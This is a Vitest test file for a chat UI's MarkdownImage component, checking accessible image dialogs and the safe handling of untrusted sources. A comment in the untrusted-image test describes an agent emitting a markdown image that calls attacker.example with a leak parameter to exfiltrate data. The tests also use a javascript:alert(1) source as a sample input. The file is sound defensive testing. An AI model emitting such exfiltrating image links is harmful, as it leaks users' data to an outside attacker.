// @vitest-environment jsdom

import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { API_URL } from "../lib/api-client";
import { SHORTCUTS, useShortcut } from "../lib/keyboard-shortcuts";
import { MarkdownImage } from "./markdown-image";

afterEach(cleanup);

/** The host's Stop shortcut, as copilot-chat-host registers it. */
function StopShortcut({ onStop }: { onStop: () => void }) {
  useShortcut(SHORTCUTS.stop, onStop);
  return null;
}

describe("MarkdownImage", () => {
  it("renders a trusted image inline as a button named with its alt text", () => {
    render(<MarkdownImage src={`${API_URL}/downloads/tok`} alt="chart" />);

    const trigger = screen.getByRole("button", { name: "Enlarge image: chart" });
    const img = trigger.querySelector("img")!;
    expect(img.getAttribute("src")).toBe(`${API_URL}/downloads/tok`);
    expect(img.getAttribute("alt")).toBe("chart");
    expect(trigger.getAttribute("type")).toBe("button");
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.queryByRole("dialog")).toBeNull();
  });

  it("opens a named dialog from the keyboard, closes only it on Escape, and returns the focus", async () => {
    const onStop = vi.fn();
    render(<><StopShortcut onStop={onStop} /><MarkdownImage src="/downloads/tok" alt="Revenue chart" /></>);
    const trigger = screen.getByRole("button", { name: "Enlarge image: Revenue chart" });
    trigger.focus();
    // A button activates on Enter and Space. The browser turns both into a click.
    fireEvent.click(trigger);

    const dialog = await screen.findByRole("dialog", { name: "Revenue chart" });
    expect(dialog.getAttribute("data-state")).toBe("open");
    expect(dialog.querySelector("img")?.getAttribute("src")).toBe("/downloads/tok");
    await waitFor(() => expect(dialog.contains(document.activeElement)).toBe(true));

    const escape = fireEvent.keyDown(document.activeElement!, { key: "Escape" });
    // Prevented, so the Stop shortcut and any panel under the image leave the key alone.
    expect(escape).toBe(false);
    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
    expect(onStop).not.toHaveBeenCalled();
    expect(document.activeElement).toBe(trigger);
  });

  it("names an image without alt text", () => {
    render(<MarkdownImage src="/downloads/tok" />);
    fireEvent.click(screen.getByRole("button", { name: "Enlarge image" }));
    expect(screen.getByRole("dialog", { name: "Image" })).toBeTruthy();
  });

  it("renders an untrusted image as a click-through link, never an <img>", () => {
    // An agent that emits ![](https://attacker.example/?leak=…) would exfiltrate
    // on render if this fetched. It must stay a link the user has to click.
    const { container } = render(<MarkdownImage src="https://attacker.example/pixel.png" alt="ignore me" />);

    const link = screen.getByRole("link");
    expect(link.getAttribute("href")).toBe("https://attacker.example/pixel.png");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link.textContent).toContain("attacker.example");
    expect(container.querySelector("img")).toBeNull();
    expect(screen.queryByRole("button")).toBeNull();
  });

  it("renders a non-HTTP(S) image source as text, never a link", () => {
    const { container } = render(<MarkdownImage src="data:image/png;base64,AAAA" alt="inline" />);

    expect(screen.queryByRole("link")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("[External image: inline (unknown host)]")).toBeTruthy();
  });

  it("renders a javascript: image source as text, never a link", () => {
    render(<MarkdownImage src="javascript:alert(1)" alt="x" />);
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("[External image: x (unknown host)]")).toBeTruthy();
  });

  it("renders nothing without a usable src", () => {
    const { container } = render(<MarkdownImage src="" alt="empty" />);
    expect(container.innerHTML).toBe("");
  });
});
